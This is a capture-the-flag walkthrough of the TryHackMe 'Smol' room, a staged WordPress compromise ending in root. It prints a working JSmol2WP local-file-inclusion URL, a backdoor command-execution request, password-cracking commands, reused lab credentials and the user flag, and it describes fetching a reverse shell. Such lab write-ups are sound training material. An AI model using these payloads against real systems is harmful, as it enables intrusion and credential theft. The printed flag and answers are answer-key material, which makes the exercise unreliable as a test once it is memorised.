# Smol

**Date:** 23/09/2026  
**Room Link:** [https://tryhackme.com/room/smol](https://tryhackme.com/room/smol?utm_source=chatgpt.com)

## 🧭 Introduction

**Smol** is a medium-difficulty Linux boot-to-root room built around a vulnerable WordPress installation. The attack chain combines a vulnerable WordPress plugin, local file inclusion, a deliberately backdoored plugin, command execution, credential cracking, lateral movement between Linux users, an exposed SSH private key, a password-protected backup archive, and finally an overly permissive `sudo` configuration.

The official room specifically highlights two themes: a publicly known vulnerable plugin and a **backdoored plugin** that requires careful source-code inspection.

The overall attack chain is:

```
Web enumeration
      ↓
WordPress
      ↓
jsmol2wp LFI
      ↓
wp-config.php
      ↓
WordPress credentials
      ↓
Backdoored Hello Dolly plugin
      ↓
RCE
      ↓
www-data shell
      ↓
Database / password hash
      ↓
diego
      ↓
think SSH key
      ↓
gege
      ↓
wordpress.old.zip
      ↓
xavi credentials
      ↓
xavi
      ↓
sudo ALL
      ↓
root
```

---

# 🔍 1. Reconnaissance

I started with an Nmap scan to identify the exposed services.

```
nmap -sC -sV <TARGET_IP>
```

The important result is:

```
22/tcp  open  ssh
80/tcp  open  http
```

➡️ Only two externally accessible services are exposed:

- **22/tcp** — SSH
- **80/tcp** — HTTP

SSH does not immediately provide a useful entry point because no credentials are known yet.

The web server is therefore the primary attack surface.

💭 **Enumeration lesson:** A small number of open ports does not necessarily mean a small attack surface. A WordPress installation can expose plugins, themes, administrative interfaces, backups, APIs and vulnerable components behind a single HTTP port.

---

# 🌐 2. Web Enumeration

Visiting the website by IP reveals that the application expects the hostname:

```
www.smol.thm
```

I added the hostname to `/etc/hosts`:

```
sudo nano /etc/hosts
```

Then added:

```
<TARGET_IP> www.smol.thm
```

The website can now be accessed through:

```
http://www.smol.thm
```

The homepage also exposes useful information, including an administrator email address.

➡️ This information may become useful later when attacking the WordPress installation.

---

# 🕵️ 3. Directory Enumeration

Next, I enumerated the web server for hidden directories.

For example:

```
gobuster dir -u http://www.smol.thm \
-w /usr/share/wordlists/dirb/common.txt
```

Among the interesting discoveries is:

```
/wp-admin
```

Navigating to:

```
http://www.smol.thm/wp-admin
```

reveals the WordPress administration login page.

At this point, the next step is identifying the installed WordPress plugins.

---

# 🔎 4. WordPress Plugin Enumeration

WPScan can enumerate WordPress plugins:

```
wpscan --url http://www.smol.thm --enumerate p
```

One particularly interesting plugin is:

```
jsmol2wp
```

Researching the plugin reveals a vulnerability affecting **JSmol2WP**, including an unauthenticated file-disclosure/LFI issue. The vulnerability is documented by WPScan.

This immediately gives us a promising route to sensitive WordPress configuration files.

---

# 📂 5. Exploiting JSmol2WP LFI

The vulnerable endpoint is:

```
/wp-content/plugins/jsmol2wp/php/jsmol.php
```

The `getRawDataFromDatabase` functionality can be abused with PHP stream wrappers to read local files.

The first target is:

```
wp-config.php
```

The relevant request is:

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

The response exposes the WordPress configuration.

Among the sensitive information is a WordPress database account:

```
wpuser
```

along with its password.

The credentials from the supplied walkthrough are:

```
Username: wpuser
Password: kbLSF2Vop#lw3rjDZ629*Z%G
```

➡️ These credentials allow authentication to the WordPress dashboard.

💭 **Important lesson:** Configuration files are among the highest-value targets for an LFI vulnerability. Files such as `wp-config.php` frequently contain database usernames, passwords, salts and other secrets.

---

# 🔐 6. WordPress Dashboard Access

Using the recovered credentials, I log into:

```
http://www.smol.thm/wp-admin
```

The WordPress dashboard is accessible.

At first glance, this looks like the point where we should search for a conventional WordPress exploit.

However, there is something much more interesting hidden inside the website.

Under **Pages**, a private page called:

```
Webmaster Tasks
```

contains information pointing toward a modified plugin.

This is a major clue.

---

# 🧩 7. Investigating the Hello Dolly Plugin

The clue points toward the WordPress **Hello Dolly** plugin.

Its PHP file is:

```
wp-content/plugins/hello.php
```

Normally, Hello Dolly is a simple demonstration plugin. However, in this room the plugin has been modified.

Because we already have an LFI vulnerability, we don't need to rely entirely on the WordPress dashboard to inspect it.

We can read its source through the same vulnerable JSmol2WP endpoint:

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
```

The response reveals the contents of `hello.php`.

During source-code inspection, a suspicious:

```
base64_decode()
```

appears.

Decoding the embedded string reveals malicious PHP functionality.

The important discovery is that the code accepts a `cmd` GET parameter and passes it to a system-command execution function.

Conceptually, the backdoor behaves like:

```
?cmd=<command>
```

➡️ We have now moved from **file disclosure** to **arbitrary command execution**.

---

# 💥 8. Confirming Remote Code Execution

The backdoor can be tested with a simple identity command.

For example:

```
/wp-admin/index.php?cmd=whoami
```

The response identifies the web-server account:

```
www-data
```

That confirms arbitrary command execution.

The vulnerability chain is now:

```
Unauthenticated LFI
        ↓
wp-config.php disclosure
        ↓
WordPress authentication
        ↓
Source-code disclosure
        ↓
Backdoored plugin
        ↓
Command execution as www-data
```

---

# 🐚 9. Obtaining a Shell as www-data

A reverse shell can now be obtained from the command-execution primitive.

The supplied walkthrough uses a shell script hosted on the attacking machine and retrieved by the target.

The general workflow is:

```
python3 -m http.server <PORT>
```

Host the reverse-shell script and then use the vulnerable `cmd` parameter to retrieve and execute it.

After the connection arrives, the listener provides a shell as:

```
www-data
```

I then stabilize the shell so that normal terminal interaction works more reliably.

➡️ We now have our initial foothold on the machine.

---

# 🗄️ 10. Enumerating the WordPress Database

With access as `www-data`, I can inspect the WordPress configuration and database environment.

The `wp-config.php` credentials previously discovered through LFI can also be used to interact with the WordPress database.

The objective is to retrieve the WordPress user password hashes.

The relevant table is:

```
wp_users
```

The password hashes can then be copied to the attacking machine and processed with John the Ripper.

For example:

```
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

The cracking process reveals credentials for another local user.

The important account is:

```
diego
```

with the password:

```
sandiegocalifornia
```

---

# 👤 11. Lateral Movement to Diego

Using the recovered credentials:

```
su diego
```

or through another appropriate local authentication method, we can become:

```
diego
```

Checking the home directory:

```
ls -la /home/diego
```

reveals:

```
user.txt
```

The recovered user flag is:

```
45edaec653ff9ee06236b7ce72b86963
```

A second independent walkthrough confirms this exact user flag.

🏁 **User Flag:**

```
45edaec653ff9ee06236b7ce72b86963
```

➡️ The first objective is complete, but Diego is not root.

---

# 🔑 12. Discovering the Think SSH Key

Now that we're operating as Diego, enumeration of the other home directories becomes important.

One interesting discovery is the private SSH key belonging to:

```
think
```

The key is located at:

```
/home/think/.ssh/id_rsa
```

Other independent walkthroughs confirm that this key is the intended route to the `think` account.

After securely copying the key to the attacking machine, its permissions need to be restricted:

```
chmod 600 id_rsa
```

Then SSH can be attempted as:

```
ssh -i id_rsa think@www.smol.thm
```

➡️ This provides access to the `think` account.

---

# 👥 13. Moving from Think to Gege

Further enumeration shows another local account:

```
gege
```

The interesting part is that the machine's authentication configuration allows the transition to this account without requiring a normal password.

An independent write-up confirms the transition:

```
think → gege
```

and identifies the relevant PAM configuration as part of the reason the passwordless `su` works.

The transition can therefore be tested with:

```
su gege
```

We are now operating as:

```
gege
```

---

# 📦 14. Discovering wordpress.old.zip

Inside Gege's home directory is an extremely interesting file:

```
wordpress.old.zip
```

Attempting to extract it:

```
unzip wordpress.old.zip
```

produces a password prompt.

The archive is therefore protected.

This is where the previous credential information becomes useful again.

The archive can be copied to the attacking machine and processed with `zip2john`.

```
zip2john wordpress.old.zip > archive_hash
```

Then crack the resulting hash with John:

```
john archive_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The password recovered by multiple independent walkthroughs is:

```
hero_gege@hotmail.com
```

---

# 📁 15. Recovering Xavi's Credentials

With the recovered password:

```
unzip wordpress.old.zip
```

The archive extracts an old WordPress installation.

Inside:

```
wordpress.old/
```

is another:

```
wp-config.php
```

Inspecting it reveals another set of database credentials:

```
DB_USER: xavi
DB_PASSWORD: P@ssw0rdxavi@
```

Independent write-ups confirm that the old configuration contains credentials for `xavi`.

This is an excellent example of why old backups are dangerous: even though the live application has changed, the historical copy still contains valid or reusable secrets.

---

# 👤 16. Lateral Movement to Xavi

The recovered password can be tested against the local `xavi` account:

```
su xavi
```

After supplying the recovered password, the shell changes to:

```
xavi
```

Checking the identity:

```
id
```

confirms that we are now operating as the `xavi` user.

At this point, we're very close to the end of the attack chain.

---

# 👑 17. Privilege Escalation

The first thing to check for a newly compromised Linux user is sudo access:

```
sudo -l
```

The result is the critical finding:

```
User xavi may run the following commands on smol:
    (ALL : ALL) ALL
```

This means `xavi` can execute commands as **any user**, including root.

➡️ There is no complicated kernel exploit required.

The privilege escalation is simply an overly permissive sudo rule.

A root shell can be obtained with:

```
sudo su -
```

Then verify:

```
whoami
```

Result:

```
root
```

---

# 🏁 18. Root Flag

The final flag is located in:

```
/root/root.txt
```

It can be read from the root shell with:

```
cat /root/root.txt
```

The official TryHackMe room confirms that the machine has both a user-flag and root-flag objective, while independent walkthroughs confirm the final privilege-escalation path through `xavi`'s unrestricted sudo permissions.

**Root flag:** The supplied write-up does not include the flag value in its text, and the independent sources I found deliberately redact or omit the actual value. I therefore won't invent one.

---

# 🗺️ Complete Attack Chain

```
Nmap
 │
 ├── 22/tcp → SSH
 │
 └── 80/tcp → WordPress
              │
              ↓
       www.smol.thm
              │
              ↓
       WPScan enumeration
              │
              ↓
        jsmol2wp plugin
              │
              ↓
        Unauthenticated LFI
              │
              ↓
        wp-config.php
              │
              ↓
      WordPress credentials
              │
              ↓
       WordPress dashboard
              │
              ↓
       Webmaster Tasks clue
              │
              ↓
      Backdoored Hello Dolly
              │
              ↓
        Command execution
              │
              ↓
           www-data
              │
              ↓
       WordPress database
              │
              ↓
       Password hash cracking
              │
              ↓
            diego
              │
              ├── user.txt
              │
              ↓
        think's id_rsa
              │
              ↓
            think
              │
              ↓
            gege
              │
              ↓
      wordpress.old.zip
              │
              ↓
         zip2john + John
              │
              ↓
       Old wp-config.php
              │
              ↓
            xavi
              │
              ↓
           sudo -l
              │
              ↓
       (ALL : ALL) ALL
              │
              ↓
            ROOT
              │
              ↓
          root.txt
```

## 🧠 Lessons Learned

- **Enumerate WordPress plugins carefully.** A single vulnerable plugin can expose files that were never intended to be public.
- **LFI can become much more serious when chained with other weaknesses.** Reading `wp-config.php` turned a file-disclosure vulnerability into credential compromise.
- **Inspect source code, not just application behavior.** The custom Hello Dolly plugin contained the backdoor that transformed LFI into RCE.
- **Never trust old backups.** `wordpress.old.zip` contained credentials that ultimately led to another local account. Independent walkthroughs confirm this was a major part of the intended attack chain.
- **Credential reuse creates lateral-movement opportunities.** Database/application credentials should never automatically be usable as operating-system passwords.
- **SSH private keys are extremely sensitive.** An exposed `id_rsa` can provide direct access to another account without needing to exploit the SSH service itself.
- **Always enumerate local users and permissions after obtaining a foothold.** The transition through `think`, `gege`, and `xavi` is largely driven by local configuration and credential exposure rather than another remote exploit.
- **Check `sudo -l` whenever you obtain a new Linux account.** In this room, the final escalation is simply:

```
xavi → sudo ALL → root
```

### 🏆 Final Results

|Objective|Result|
|---|---|
|Initial access|JSmol2WP LFI|
|Credential disclosure|`wp-config.php`|
|RCE|Backdoored Hello Dolly|
|Initial shell|`www-data`|
|Lateral movement|`diego`|
|User flag|`45edaec653ff9ee06236b7ce72b86963`|
|SSH lateral movement|`think`|
|Further movement|`gege`|
|Backup cracked|`wordpress.old.zip`|
|Archive password|`hero_gege@hotmail.com`|
|Final user|`xavi`|
|Privilege escalation|`sudo (ALL : ALL) ALL`|
|Root access|`sudo su -`|
|Root flag|**Not present in the supplied text / independently verified sources**|

The particularly useful part of **Smol** is that almost every step teaches a different pentesting habit: **enumerate → identify → research → exploit → enumerate again → move laterally → enumerate again → escalate**. The room is less about one spectacular exploit and more about recognizing how several small weaknesses can be chained into complete compromise.